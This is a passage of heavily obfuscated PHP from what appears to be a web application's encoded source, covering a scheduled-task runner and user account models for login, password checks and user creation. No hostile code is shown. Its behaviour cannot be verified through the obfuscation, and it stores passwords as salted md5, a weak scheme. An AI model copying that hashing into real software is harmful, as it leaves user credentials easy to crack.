$Úâ•ÒŞå = time(); if ($Úâ•ÒŞå - $²™™ş› >= 60) { self::valueSet(array($Ñ¹ª·£í[1628] => $Ñ¹ª·£í[88], $Ñ¹ª·£í[1629] => $Úâ•ÒŞå), !1); $²™™ş› = $Úâ•ÒŞå; } if (!file_exists(USER_SYSTEM . $Ñ¹ª·£í[1636])) { self::valueSet(array($Ñ¹ª·£í[1628] => $Ñ¹ª·£í[197], $Ñ¹ª·£í[756] => $Ñ¹ª·£í[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $š²ˆæÄ =& $_SERVER[Ü©»’·]; http_close(); self::valueSet($š²ˆæÄ[756], $š²ˆæÄ[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($š²ˆæÄ[1628] => $š²ˆæÄ[197], $š²ˆæÄ[756] => $š²ˆæÄ[88]), !1); } public static function taskSwitch() { $à¸ÛıÕÄ =& $_SERVER[Ü©»’·]; $åÎÎÒÍÁ = self::valueGet($à¸ÛıÕÄ[756]) == $à¸ÛıÕÄ[88] ? $à¸ÛıÕÄ[197] : $à¸ÛıÕÄ[88]; self::valueSet($à¸ÛıÕÄ[756], $åÎÎÒÍÁ); } public static function shutdownEvent() { $ÃÄá“Ë =& $_SERVER[Ü©»’·]; self::valueSet($ÃÄá“Ë[1628], $ÃÄá“Ë[197]); self::log($ÃÄá“Ë[1637]); } public static function config($ÃåİÈ€‘, $Ñæ»¾‹Ã) { self::valueSet($_SERVER[Ü©»’·][756], $ÃåİÈ€‘); } private static function taskRunAll() { $¦á¯â·ö =& $_SERVER[Ü©»’·]; $˜ÏŒ¦›œ = timeFloat(); $¯½¡‘€¸ = Model($¦á¯â·ö[1638])->listData(); $õ¾³Ş‡ = count($¯½¡‘€¸); for ($„¼»ó”ş = 0; $„¼»ó”ş < $õ¾³Ş‡; $„¼»ó”ş++) { $šÜ€¹î = $¯½¡‘€¸[$„¼»ó”ş]; if (!$šÜ€¹î[$¦á¯â·ö[408]] || $šÜ€¹î[$¦á¯â·ö[1639]] != $¦á¯â·ö[88]) { continue; } if (!self::taskTimeCheck($šÜ€¹î)) { continue; } self::taskRun($šÜ€¹î); } Hook::trigger($¦á¯â·ö[1640]); self::taskQueueRun($˜ÏŒ¦›œ); } private static function taskQueueRun($ËäÙ½†È) { $½˜¬¤È = 10; while (!0) { $ãŒùí´õ = TaskQueue::run(); if ($ãŒùí´õ === !1) { break; } if (timeFloat() - $ËäÙ½†È >= $½˜¬¤È) { break; } } } private static function taskTimeCheck($Ÿ’–×²) { $Ã‘ùüÀ‚ =& $_SERVER[Ü©»’·]; $›À’Õò­ = json_decode($Ÿ’–×²[$Ã‘ùüÀ‚[203]], !0); $÷š€ûöˆ = intval($Ÿ’–×²[$Ã‘ùüÀ‚[1629]]); $â ÷‹¬” = strtotime($Ã‘ùüÀ‚[1641] . $›À’Õò­[$Ã‘ùüÀ‚[1642]] . $Ã‘ùüÀ‚[1643]) - strtotime($Ã‘ùüÀ‚[1644]); $âÍÇš±è = time() - strtotime(date($Ã‘ùüÀ‚[1645]) . $Ã‘ùüÀ‚[1646]); $§²äŠ = $âÍÇš±è >= $â ÷‹¬” && $âÍÇš±è <= $â ÷‹¬” + 3600; switch ($›À’Õò­[$Ã‘ùüÀ‚[33]]) { case $Ã‘ùüÀ‚[1647]: if (time() - $÷š€ûöˆ < 3600 * 24 * 30) { return !1; } if ($›À’Õò­[$Ã‘ùüÀ‚[1647]] == date($Ã‘ùüÀ‚[1648]) && $§²äŠ) { return !0; } break; case $Ã‘ùüÀ‚[1649]: if (time() - $÷š€ûöˆ < 3600 * 24 * 7) { return !1; } $¼°…Î¾ä = date($Ã‘ùüÀ‚[1650]) == 0 ? 7 : date($Ã‘ùüÀ‚[1650]); if ($›À’Õò­[$Ã‘ùüÀ‚[1649]] == $¼°…Î¾ä && $§²äŠ) { return !0; } break; case $Ã‘ùüÀ‚[1642]: if (time() - $÷š€ûöˆ < 3600 * 24) { return !1; } if ($§²äŠ) { return !0; } break; case $Ã‘ùüÀ‚[1651]: if (time() - $÷š€ûöˆ >= floatval($›À’Õò­[$Ã‘ùüÀ‚[1651]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $°ò‡Éã‹ =& $_SERVER[Ü©»’·]; static $Š™”¢ò = 0; $¼É¿áÓŒ = 300; if (!$Š™”¢ò) { $Š™”¢ò = time(); } if (time() - $Š™”¢ò < $¼É¿áÓŒ) { return; } $Š™”¢ò = time(); $û‹›í = Model($°ò‡Éã‹[522])->db($°ò‡Éã‹[12]); if ($û‹›í) { $û‹›í->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($°ò‡Éã‹[1652], $°ò‡Éã‹[1653]); die; } } public static function taskRun($Ÿë‘±«Ü) { $–ÙÛâ®¬ =& $_SERVER[Ü©»’·]; self::log($–ÙÛâ®¬[1654] . $Ÿë‘±«Ü[$–ÙÛâ®¬[408]] . $–ÙÛâ®¬[1655] . $Ÿë‘±«Ü[$–ÙÛâ®¬[32]] . $–ÙÛâ®¬[1656] . $Ÿë‘±«Ü[$–ÙÛâ®¬[1657]]); Model($–ÙÛâ®¬[1638])->run($Ÿë‘±«Ü[$–ÙÛâ®¬[408]]); $ñç‚éÓ° = timeFloat(); $Œ”¦İÎ = $–ÙÛâ®¬[12]; switch ($Ÿë‘±«Ü[$–ÙÛâ®¬[33]]) { case $–ÙÛâ®¬[307]: $™Ö‹³ = url_request($Ÿë‘±«Ü[$–ÙÛâ®¬[1657]], $–ÙÛâ®¬[230], !1, !1, !1, !1, 10); if ($™Ö‹³[$–ÙÛâ®¬[756]]) { $Œ”¦İÎ = strlen($™Ö‹³[$–ÙÛâ®¬[1206]]); } break; case $–ÙÛâ®¬[229]: $Œ”¦İÎ = Hook::apply($Ÿë‘±«Ü[$–ÙÛâ®¬[1657]]); default: break; } Model($–ÙÛâ®¬[1658])->add(array($–ÙÛâ®¬[1659] => $–ÙÛâ®¬[12], $–ÙÛâ®¬[1660] => $–ÙÛâ®¬[197], $–ÙÛâ®¬[33] => $–ÙÛâ®¬[1661] . $Ÿë‘±«Ü[$–ÙÛâ®¬[408]], $–ÙÛâ®¬[1662] => json_encode(array($–ÙÛâ®¬[32] => $Ÿë‘±«Ü[$–ÙÛâ®¬[32]], $–ÙÛâ®¬[1663] => timeFloat() - $ñç‚éÓ°, $–ÙÛâ®¬[293] => $Œ”¦İÎ)))); $Ê¹¦€õ = $Œ”¦İÎ ? $–ÙÛâ®¬[1664] . $Œ”¦İÎ : $–ÙÛâ®¬[12]; self::log($–ÙÛâ®¬[1665] . $Ÿë‘±«Ü[$–ÙÛâ®¬[408]] . $–ÙÛâ®¬[164] . $Ê¹¦€õ); return !0; } private static function valueGet($¿®æŸŞ…) { $ùÀÑºÔ° =& $_SERVER[Ü©»’·]; $‘ó•­ëÔ = $ùÀÑºÔ°[1666]; $ÌŞÀ´• = Model($ùÀÑºÔ°[444])->get($¿®æŸŞ…, $‘ó•­ëÔ); if (is_null($ÌŞÀ´•)) { Model($ùÀÑºÔ°[444])->set($ùÀÑºÔ°[756], $ùÀÑºÔ°[88], $‘ó•­ëÔ); Model($ùÀÑºÔ°[444])->set($ùÀÑºÔ°[1628], $ùÀÑºÔ°[197], $‘ó•­ëÔ); $ÌŞÀ´• = Model($ùÀÑºÔ°[444])->get($¿®æŸŞ…, $‘ó•­ëÔ); } return $ÌŞÀ´•; } private static function valueSet($µÕ„£Ş†, $ÑêëÖëŠ) { $”ØùÀ¡ =& $_SERVER[Ü©»’·]; $ñÕèİä = $”ØùÀ¡[1667]; CacheLock::lock($ñÕèİä); $šÕÑ†¢Â = Model($”ØùÀ¡[444])->set($µÕ„£Ş†, $ÑêëÖëŠ, $”ØùÀ¡[1666]); CacheLock::unlock($ñÕèİä); return $šÕÑ†¢Â; } protected static function log($Î’™Ò¶Õ) { write_log($Î’™Ò¶Õ, $_SERVER[Ü©»’·][1653]); } private static function cacheClear() { $“–Ïä… =& $_SERVER[Ü©»’·]; Cache::clearMemory(Model($“–Ïä…[444])->cacheKey($“–Ïä…[1666])); Cache::clearMemory(Model($“–Ïä…[444])->cacheKey($“–Ïä…[1668])); Model($“–Ïä…[1638])->cacheClear(); self::closeDatabase(); } } goto EšÍ×Ô·‘µ; BÌÆ„‚ËƒË: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\152\x6f\142\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x64\x65\x73\143", "\x73\157\x72\x74"); const JOB_KEY = "\163\145\x6c\x66\x4a\157\142\114\151\163\x74"; public function listData($Ë¦Ş£ÒÓ = false, $Ş±£Ë«À = "\x73\157\162\x74", $¦ç§•ªœ = false) { return parent::listData($Ë¦Ş£ÒÓ, $Ş±£Ë«À, $¦ç§•ªœ); } public function remove($ø¡Ê¯Øï) { return parent::remove($ø¡Ê¯Øï); } public function add($—áíŠ‘É) { $Üà×š¡ª =& $_SERVER[Ü©»’·]; if ($this->findByName($—áíŠ‘É[$Üà×š¡ª[32]])) { return !1; } $—áíŠ‘É[$Üà×š¡ª[1882]] = $this->getSort(); return parent::insert($—áíŠ‘É); } private function getSort() { $ô±Ú‘¸’ =& $_SERVER[Ü©»’·]; $–—àä = parent::listData(); $ò®Í’í• = array_to_keyvalue($–—àä, $ô±Ú‘¸’[12], $ô±Ú‘¸’[1882]); return empty($ò®Í’í•) ? 0 : max($ò®Í’í•) + 1; } public function update($—ÍŞ¤Ê, $Ú«Õı æ) { $ƒŒ°ÀÈÁ =& $_SERVER[Ü©»’·]; $±öØÆŞ¤ = parent::listData($—ÍŞ¤Ê); $İÃÉ†ôó = $this->findByName($Ú«Õı æ[$ƒŒ°ÀÈÁ[32]]); if (!$±öØÆŞ¤ || $İÃÉ†ôó && $İÃÉ†ôó[$ƒŒ°ÀÈÁ[408]] != $±öØÆŞ¤[$ƒŒ°ÀÈÁ[408]]) { return !1; } return parent::update($—ÍŞ¤Ê, $Ú«Õı æ); } public function setUserJob($ÂêÁåœ, $ÔÛıòêÙ) { $ô¦¢ß—à =& $_SERVER[Ü©»’·]; if (!is_array($ÔÛıòêÙ)) { $ÔÛıòêÙ = array($ÔÛıòêÙ); } $ÎÛ÷é‰Ã = parent::listData(); $ÂºĞ¬ú = array_to_keyvalue($ÎÛ÷é‰Ã, $ô¦¢ß—à[32]); $¬ŞÑ÷®¬ = $ô¦¢ß—à[387]; foreach ($ÔÛıòêÙ as $»Š„É¯) { if ($ÂºĞ¬ú[$»Š„É¯]) { $¬ŞÑ÷®¬ .= $ÂºĞ¬ú[$»Š„É¯][$ô¦¢ß—à[408]] . $ô¦¢ß—à[50]; } else { $Ùó’İëº = $this->add($»Š„É¯); $¬ŞÑ÷®¬ .= $Ùó’İëº . $ô¦¢ß—à[50]; } } $¬ŞÑ÷®¬ = rtrim($¬ŞÑ÷®¬, $ô¦¢ß—à[50]); Model($ô¦¢ß—à[544])->metaSet($ÂêÁåœ, self::JOB_KEY, $¬ŞÑ÷®¬); } public function getUserJob($ùÜÈÈÓ») { $ÉÈ±È¯÷ = Model($_SERVER[Ü©»’·][544])->metaGet($ùÜÈÈÓ»); return $this->getUserJobInfo($ÉÈ±È¯÷[self::JOB_KEY]); } public function getUserJobInfo($Âµ·£ö) { $÷”†à÷ =& $_SERVER[Ü©»’·]; $šÎ—Å‰÷ = explode($÷”†à÷[50], $Âµ·£ö); $›‘óâÍ¶ = parent::listData(); $›‘óâÍ¶ = array_remove_key($›‘óâÍ¶, $÷”†à÷[200]); $¯åŒÍº = array(); foreach ($šÎ—Å‰÷ as $‰£×‹Ÿ) { if (isset($›‘óâÍ¶[$‰£×‹Ÿ])) { $¯åŒÍº[] = $›‘óâÍ¶[$‰£×‹Ÿ]; } } return $¯åŒÍº; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\155\x65" => "\x75\163\x65\162\137\155\145\164\141", "\x6d\x65\164\x61\106\x69\x65\x6c\144" => "\x75\163\145\162\111\x44"); protected $simpleField = "\x75\163\145\x72\111\104\x2c\x6e\x69\143\x6b\x4e\141\155\x65\54\x6e\x61\155\x65\x2c\x61\x76\141\x74\141\x72\54\x73\x65\x78\54\x73\x74\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ì«×Ÿ¾ ) { $Â²µõ„€ =& $_SERVER[Ü©»’·]; $‚®××Ûê = $Â²µõ„€[2301]; return array($Â²µõ„€[1936] => array($ì«×Ÿ¾ [0], $‚®××Ûê), $Â²µõ„€[1938] => array($ì«×Ÿ¾ [0], $‚®××Ûê), $Â²µõ„€[2302] => array($ì«×Ÿ¾ [0], $‚®××Ûê)); } protected function getInfo($Õš¥ñª, $€Ôå–¤ = false) { $ıéî›çí = $this->getInfoSimple($Õš¥ñª); if (!is_array($ıéî›çí)) { return array(); } if ($€Ôå–¤) { return $this->_getInfoApply($ıéî›çí); } return $this->cacheFunctionGet($_SERVER[Ü©»’·][1940], $Õš¥ñª); } protected function getInfoFull($òÎÀÆ˜¦, $—¯ùÉãÕ = false) { $šÂë³©É = $this->getInfoSimple($òÎÀÆ˜¦); if (!is_array($šÂë³©É)) { return array(); } if ($—¯ùÉãÕ) { return $this->_getInfoApply($šÂë³©É, !0); } return $this->cacheFunctionGet($_SERVER[Ü©»’·][2303], $òÎÀÆ˜¦); } private function _getInfoApply($Üüî™ø­, $¬ö‡Ïéë = false) { $ğ¹‘®şÉ =& $_SERVER[Ü©»’·]; if (!$Üüî™ø­) { return $Üüî™ø­; } $ú›ñüí˜ = md5($ğ¹‘®şÉ[2304] . $Üüî™ø­[$ğ¹‘®şÉ[892]] . $ğ¹‘®şÉ[2305] . $Üüî™ø­[$ğ¹‘®şÉ[32]]); $Üüî™ø­ = $this->_listDataApplyItem($Üüî™ø­); $ ¦¦°‹ = Model($ğ¹‘®şÉ[1339])->metaGet($Üüî™ø­[$ğ¹‘®şÉ[86]][$ğ¹‘®şÉ[411]]); $Üüî™ø­[$ğ¹‘®şÉ[2306]] = $ú›ñüí˜; $Üüî™ø­[$ğ¹‘®şÉ[86]][$ğ¹‘®şÉ[2127]] = isset($ ¦¦°‹[$ğ¹‘®şÉ[2128]]) ? $ ¦¦°‹[$ğ¹‘®şÉ[2128]] : null; if ($¬ö‡Ïéë) { $Üüî™ø­[$ğ¹‘®şÉ[475]] = $this->metaGet($Üüî™ø­[$ğ¹‘®şÉ[1669]]); } return $Üüî™ø­; } protected function getInfoSimple($ŞëÈ“Çá, $‘Ôƒ½ú = false) { $øîâ„Øæ =& $_SERVER[Ü©»’·]; if (!$ŞëÈ“Çá) { return array(); } if ($‘Ôƒ½ú) { $ğ¬Ÿ”› = $this->where(array($øîâ„Øæ[1669] => intval($ŞëÈ“Çá)))->find(); if (!is_array($ğ¬Ÿ”›)) { return array(); } $ğ¬Ÿ”›[$øîâ„Øæ[552]] = Action($øîâ„Øæ[2307])->parseUrl($ğ¬Ÿ”›[$øîâ„Øæ[552]]); return $ğ¬Ÿ”›; } return $this->cacheFunctionGet($øîâ„Øæ[1941], $ŞëÈ“Çá); } protected function getInfoSimpleOuter($Æé“ÃñŸ) { $–Å«Ÿ„  =& $_SERVER[Ü©»’·]; if (!$Æé“ÃñŸ || $Æé“ÃñŸ == 0) { return array($–Å«Ÿ„ [1669] => $–Å«Ÿ„ [197], $–Å«Ÿ„ [32] => $–Å«Ÿ„ [162] . LNG($–Å«Ÿ„ [2308]) . $–Å«Ÿ„ [164], $–Å«Ÿ„ [552] => STATIC_PATH . $–Å«Ÿ„ [2309]); } $¯ˆÅóå• = $this->cacheFunctionGet($–Å«Ÿ„ [1941], $Æé“ÃñŸ); $Íô”ŒÆ  = array_field_key($¯ˆÅóå•, explode($–Å«Ÿ„ [50], $this->simpleField)); if (!$Íô”ŒÆ ) { return array($–Å«Ÿ„ [1669] => $–Å«Ÿ„ [1192], $–Å«Ÿ„ [32] => $–Å«Ÿ„ [162] . LNG($–Å«Ÿ„ [2310]) . $–Å«Ÿ„ [164], $–Å«Ÿ„ [552] => STATIC_PATH . $–Å«Ÿ„ [2311]); } $Íô”ŒÆ [$–Å«Ÿ„ [552]] = Action($–Å«Ÿ„ [2307])->parseUrl($Íô”ŒÆ [$–Å«Ÿ„ [552]]); return $Íô”ŒÆ ; } protected function groupUser($ÉÆÎË¼˜) { } public static function errorLang($ÓĞòí¢) { $Ú¸Ù²Úà =& $_SERVER[Ü©»’·]; $ôµÁ”¬ = array(self::ERROR_USER_NOT_EXISTS => $Ú¸Ù²Úà[2312], self::ERROR_USER_PASSWORD_ERROR => $Ú¸Ù²Úà[2313], self::ERROR_USER_EXIST_NAME => $Ú¸Ù²Úà[2314], self::ERROR_USER_EXIST_PHONE => $Ú¸Ù²Úà[2315], self::ERROR_USER_EXIST_EMAIL => $Ú¸Ù²Úà[2316], self::ERROR_USER_LOGIN_LOCK => $Ú¸Ù²Úà[2317], self::ERROR_IP_NOT_ALLOW => $Ú¸Ù²Úà[2318], self::ERROR_USER_EXIST_NICKNAME => $Ú¸Ù²Úà[2319]); return LNG($ôµÁ”¬[$ÓĞòí¢]); } public function getInfoByMeta($‡ß¥öÕŒ, $öØÇ‹Ï) { $‚ƒ¦“Ú½ =& $_SERVER[Ü©»’·]; $‘ØÅÛË¯ = Model($‚ƒ¦“Ú½[2320])->where(array($‚ƒ¦“Ú½[94] => $‡ß¥öÕŒ, $‚ƒ¦“Ú½[383] => $öØÇ‹Ï))->find(); if ($‘ØÅÛË¯) { return $this->getInfo($‘ØÅÛË¯[$‚ƒ¦“Ú½[1669]]); } return !1; } public function userLoginCheck($ˆŞİ×ãÑ, $¤†µÃ ) { $‹Ş®øŞ‹ =& $_SERVER[Ü©»’·]; $åİã§Îƒ = $this->userLoginFind($ˆŞİ×ãÑ); if (!$åİã§Îƒ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($åİã§Îƒ[$‹Ş®øŞ‹[1669]], $¤†µÃ )) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($åİã§Îƒ[$‹Ş®øŞ‹[1669]]); } public function userLoginFind($¢àªÚß) { $±‡ Èß­ =& $_SERVER[Ü©»’·]; $èÇ¬¸‘ = array($±‡ Èß­[32] => $¢àªÚß, $±‡ Èß­[551] => $¢àªÚß, $±‡ Èß­[305] => $¢àªÚß, $±‡ Èß­[2321] => $¢àªÚß, $±‡ Èß­[1003] => $±‡ Èß­[1005]); if ($this->nickNameRpt()) { unset($èÇ¬¸‘[$±‡ Èß­[551]]); } return $this->where($èÇ¬¸‘)->find(); } public function clearCache($°Åò¯èß) { $Àó²Å =& $_SERVER[Ü©»’·]; $this->cacheFunctionClear($Àó²Å[1940], $°Åò¯èß); $this->cacheFunctionClear($Àó²Å[1941], $°Åò¯èß); $this->cacheFunctionClear($Àó²Å[2303], $°Åò¯èß); } public function userPasswordCheck($•§¬åµâ, $—˜ƒò—‰) { $Æ´£ê¾ñ =& $_SERVER[Ü©»’·]; $‹ü°Ñ¶Ø = $this->where(array($Æ´£ê¾ñ[1669] => intval($•§¬åµâ)))->find(); $ş·ï‹Î = $this->metaGet($•§¬åµâ); $íÌ¦çÂÂ = isset($ş·ï‹Î[$Æ´£ê¾ñ[2322]]) ? $ş·ï‹Î[$Æ´£ê¾ñ[2322]] : $Æ´£ê¾ñ[12]; if (md5($íÌ¦çÂÂ . trim($—˜ƒò—‰)) !== $‹ü°Ñ¶Ø[$Æ´£ê¾ñ[892]]) { return !1; } return !0; } public function userAdd($Úİ”ÔÇ¯) { $½Ã­îÛ• =& $_SERVER[Ü©»’·]; $òÇøû¤º = array($½Ã­îÛ•[429] => $Úİ”ÔÇ¯[$½Ã­îÛ•[32]], $½Ã­îÛ•[2323] => $Úİ”ÔÇ¯[$½Ã­îÛ•[1548]], $½Ã­îÛ•[2324] => isset($Úİ”ÔÇ¯[$½Ã­îÛ•[305]]) ? $Úİ”ÔÇ¯[$½Ã­îÛ•[305]] : $½Ã­îÛ•[12], $½Ã­îÛ•[2325] => isset($Úİ”ÔÇ¯[$½Ã­îÛ•[2321]]) ? $Úİ”ÔÇ¯[$½Ã­îÛ•[2321]] : $½Ã­îÛ•[12], $½Ã­îÛ•[2326] => isset($Úİ”ÔÇ¯[$½Ã­îÛ•[551]]) ? $Úİ”ÔÇ¯[$½Ã­îÛ•[551]] : $Úİ”ÔÇ¯[$½Ã­îÛ•[32]], $½Ã­îÛ•[2327] => isset($Úİ”ÔÇ¯[$½Ã­îÛ•[552]]) ? $Úİ”ÔÇ¯[$½Ã­îÛ•[552]] : $½Ã­îÛ•[12], $½Ã­îÛ•[2328] => isset($Úİ”ÔÇ¯[$½Ã­îÛ•[2329]]) ? $Úİ”ÔÇ¯[$½Ã­îÛ•[2329]] : 1, $½Ã­îÛ•[2330] => $Úİ”ÔÇ¯[$½Ã­îÛ•[892]], $½Ã­îÛ•[1942] => isset($Úİ”ÔÇ¯[$½Ã­îÛ•[1845]]) ? $Úİ”ÔÇ¯[$½Ã­îÛ•[1845]] : 1024 * 1024 * 20, $½Ã­îÛ•[1943] => 0, $½Ã­îÛ•[2331] => 0, $½Ã­îÛ•[1987] => isset($Úİ”ÔÇ¯[$½Ã­îÛ•[756]]) ? $Úİ”ÔÇ¯[$½Ã­îÛ•[756]] : 1); if (!empty($Úİ”ÔÇ¯[$½Ã­îÛ•[1669]])) { $òÇøû¤º[$½Ã­îÛ•[1669]] = $Úİ”ÔÇ¯[$½Ã­îÛ•[1669]]; } $›ğ·©ß = $this->_checkExist($Úİ”ÔÇ¯); if ($›ğ·©ß !== !0) { return $›ğ·©ß; } if (!empty($òÇøû¤º[$½Ã­îÛ•[552]]) && strlen($òÇøû¤º[$½Ã­îÛ•[552]]) > 255) { $òÇøû¤º[$½Ã­îÛ•[552]] = $½Ã­îÛ•[12]; } $œ¡°¨ë‡ = $this->add($òÇøû¤º); $²à§¨õù = array($½Ã­îÛ•[2330] => $òÇøû¤º[$½Ã­îÛ•[892]], $½Ã­îÛ•[2326] => $òÇøû¤º[$½Ã­îÛ•[551]]); $this->userEdit($œ¡°¨ë‡, $²à§¨õù); Model($½Ã­îÛ•[1339])->userRootAdd($œ¡°¨ë‡); return $œ¡°¨ë‡; } protected function userEditTest($Ò¦Òîş, $€øš¨Œ¶) { return $this->call($_SERVER[Ü©»’·][2332], $Ò¦Òîş, $€øš¨Œ¶); } protected function userEdit($ñ¾æ„ÆÉ, $ıÆóü©ê) { $²ƒ’ÖÆ =& $_SERVER[Ü©»’·]; $«ËŸîÑÛ = $this->getInfoSimple($ñ¾æ„ÆÉ); if (!$«ËŸîÑÛ) { return !1; } $ÑõÑ¥ˆ¾ = $this->_checkExist($ıÆóü©ê, $ñ¾æ„ÆÉ); if ($ÑõÑ¥ˆ¾ !== !0) { return $ÑõÑ¥ˆ¾; } if (isset($ıÆóü©ê[$²ƒ’ÖÆ[892]]) && trim($ıÆóü©ê[$²ƒ’ÖÆ[892]]) != $²ƒ’ÖÆ[12]) { $—çâŞ»¥ = $this->metaGet($ñ¾æ„ÆÉ); if (empty($—çâŞ»¥[$²ƒ’ÖÆ[2322]])) { $—çâŞ»¥[$²ƒ’ÖÆ[2322]] = rand_string(10); Model($²ƒ’ÖÆ[522])->metaSet($ñ¾æ„ÆÉ, $²ƒ’ÖÆ[2322], $—çâŞ»¥[$²ƒ’ÖÆ[2322]]); } $ıÆóü©ê[$²ƒ’ÖÆ[892]] = md5($—çâŞ»¥[$²ƒ’ÖÆ[2322]] . trim($ıÆóü©ê[$²ƒ’ÖÆ[892]])); } else { unset($ıÆóü©ê[$²ƒ’ÖÆ[892]]); } if (!empty($ıÆóü©ê[$²ƒ’ÖÆ[552]]) && strlen($ıÆóü©ê[$²ƒ’ÖÆ[552]]) > 255) { $ıÆóü©ê[$²ƒ’ÖÆ[552]] = $²ƒ’ÖÆ[12]; } $this->where(array($²ƒ’ÖÆ[1660] => $ñ¾æ„ÆÉ))->save($ıÆóü©ê); if (isset($ıÆóü©ê[$²ƒ’ÖÆ[551]])) { $this->setNamePinyin($ñ¾æ„ÆÉ, $ıÆóü©ê[$²ƒ’ÖÆ[551]]); } $this->clearCache($ñ¾æ„ÆÉ); return !0; } public function setNamePinyin($¾Æ„±©ğ, $º‰©Ø = false) { $ÇçÂÀ‚ =& $_SERVER[Ü©»’·]; if (!$º‰©Ø) { $¢Ò£»›ì = $this->getInfoSimple($¾Æ„±©ğ); $º‰©Ø = $¢Ò£»›ì[$ÇçÂÀ‚[551]] ? $¢Ò£»›ì[$ÇçÂÀ‚[551]] : $¢Ò£»›ì[$ÇçÂÀ‚[32]]; } $ÏıÄÓ›Ç = Model($ÇçÂÀ‚[544]); if (!Input::check($º‰©Ø, $ÇçÂÀ‚[602])) { return $ÏıÄÓ›Ç->metaSet($¾Æ„±©ğ, array($ÇçÂÀ‚[474] => $ÇçÂÀ‚[12], $ÇçÂÀ‚[473] => $ÇçÂÀ‚[12])); } return $ÏıÄÓ›Ç->metaSet($¾Æ„±©ğ, array($ÇçÂÀ‚[474] => str_replace($ÇçÂÀ‚[53], $ÇçÂÀ‚[12], Pinyin::get($º‰©Ø)), $ÇçÂÀ‚[473] => Pinyin::get($º‰©Ø, $ÇçÂÀ‚[603]))); } private function nickNameRpt() { $¦¤ä‹Ô– =& $_SERVER[Ü©»’·]; $÷ Ÿøˆæ = Model($¦¤ä‹Ô–[776])->get($¦¤ä‹Ô–[2333]); $ŞğëƒÒè = $GLOBALS[$¦¤ä‹Ô–[6]][$¦¤ä‹Ô–[390]][$¦¤ä‹Ô–[2333]]; $¤Ïë…ò¦ = !is_null($÷ Ÿøˆæ) ? $÷ Ÿøˆæ : $ŞğëƒÒè; return !!$¤Ïë…ò¦; } private function _checkExist($‰Ø»öÏ, $ª«†õ—ğ = false) { $§³ÄúŸ• =& $_SERVER[Ü©»’·]; $ÌÆšËÄ = array($§³ÄúŸ•[32] => UserModel::ERROR_USER_EXIST_NAME, $§³ÄúŸ•[551] => UserModel::ERROR_USER_EXIST_NICKNAME, $§³ÄúŸ•[305] => UserModel::ERROR_USER_EXIST_EMAIL, $§³ÄúŸ•[2321] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÌÆšËÄ[$§³ÄúŸ•[551]]); } $’ë¾Ğöğ = $ª«†õ—ğ ? array($§³ÄúŸ•[1669] => array($§³ÄúŸ•[2334], $ª«†õ—ğ)) : array(); foreach ($ÌÆšËÄ as $ÉŞøùå¨ => $ŞÕÕÏè) { $òıåµçÆ = array(); foreach ($ÌÆšËÄ as $ø˜îÂÆí => $Ê©¤îÊì) { if (isset($‰Ø»öÏ[$ø˜îÂÆí]) && $‰Ø»öÏ[$ø˜îÂÆí]) { $òıåµçÆ[] = $‰Ø»öÏ[$ø˜îÂÆí]; } } if (!$òıåµçÆ) { continue; } $×¾µ¯ùÅ = array_merge(array($ÉŞøùå¨ => array($§³ÄúŸ•[7], $òıåµçÆ)), $’ë¾Ğöğ); $äÑ‚¯ÙÒ = $this->where($×¾µ¯ùÅ)->find(); if ($äÑ‚¯ÙÒ) { return $ŞÕÕÏè; } } return !0; } public function userListInfo($’»êˆöÜ) { $ÖÑ¾ Ëß =& $_SERVER[Ü©»’·]; $êÖõ‘“Ò = array(); $’»êˆöÜ = is_array($’»êˆöÜ) ? array_unique($’»êˆöÜ) : array(); if (!$’»êˆöÜ) { return $êÖõ‘“Ò; } if (count($’»êˆöÜ) < 20) { foreach ($’»êˆöÜ as $™ÏûÓÆÓ) { $êÖõ‘“Ò[$™ÏûÓÆÓ . $ÖÑ¾ Ëß[12]] = $this->getInfoSimpleOuter($™ÏûÓÆÓ); } } else { $³ÁëâÑÙ = array($ÖÑ¾ Ëß[1660] => array($ÖÑ¾ Ëß[427], $’»êˆöÜ)); if (count($’»êˆöÜ) == 1) { $³ÁëâÑÙ = array($ÖÑ¾ Ëß[1660] => $’»êˆöÜ[0]); } $ĞáêÈÜí = Model($ÖÑ¾ Ëß[522])->field($this->simpleField)->where($³ÁëâÑÙ)->select(); $ĞáêÈÜí = array_to_keyvalue($ĞáêÈÜí, $ÖÑ¾ Ëß[1669]); foreach ($’»êˆöÜ as $™ÏûÓÆÓ) { $Ô‘˜—ÈÍ = $ĞáêÈÜí[$™ÏûÓÆÓ]; if (!$Ô‘˜—ÈÍ) { $êÖõ‘“Ò[$™ÏûÓÆÓ . $ÖÑ¾ Ëß[12]] = $this->getInfoSimpleOuter($™ÏûÓÆÓ); continue; } $Ô‘˜—ÈÍ[$ÖÑ¾ Ëß[552]] = Action($ÖÑ¾ Ëß[2307])->parseUrl($Ô‘˜—ÈÍ[$ÖÑ¾ Ëß[552]]); $êÖõ‘“Ò[$™ÏûÓÆÓ . $ÖÑ¾ Ëß[12]] = $Ô‘˜—ÈÍ; } } return $êÖõ‘“Ò; } protected function userStatus($•¸¢£üõ, $ÀÎ‘ó÷ã) { $ÚÄ¯«Œ = $this->getInfoSimple($•¸¢£üõ); if (!$ÚÄ¯«Œ) { return !1; } $€î¾°ƒ® = array($_SERVER[Ü©»’·][756] => $ÀÎ‘ó÷ã); return $this->userEdit($•¸¢£üõ, $€î¾°ƒ®); } protected function userRemove($‹†™Ä®—) { $ì²ÂÃ¦Á =& 